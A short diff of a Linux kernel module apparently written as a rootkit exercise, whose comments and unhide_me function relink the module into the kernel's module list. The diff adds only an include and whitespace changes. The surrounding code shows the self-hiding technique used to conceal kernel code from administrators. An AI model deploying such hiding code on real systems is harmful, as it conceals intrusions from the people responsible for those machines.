@@ -1,5 +1,6 @@
 #include <linux/module.h>    /* Needed by all modules */
 #include <linux/kernel.h>    /* Needed for KERN_INFO */
+#include <linux/fs.h>
 //#include <linux/sched.h>
 //#include <linux/list.h>
 
@@ -20,6 +21,7 @@ struct list_head tos;
 // for convenience, I'm using the following notations for fun pointers:
 // fun_<return type>_<arg1>_<arg2>_<arg3>_...
 typedef int (*fun_int_void)(void);
+
 
 /*
  * Hiding a module is basically just removing it from the list of modules
@@ -52,7 +54,6 @@ void unhide_me(void)
     //insert this module into the list of modules (to the front)
     mods->next->prev = this_list_head; // let prev of the (former) first module point to us
     this_list_head->next = mods->next; // let our next pointer point to the former first module
-
 
     mods->next = this_list_head; // let the modules list next pointer point to us
     this_list_head->prev = mods; // let out prev pointer point to the modules list
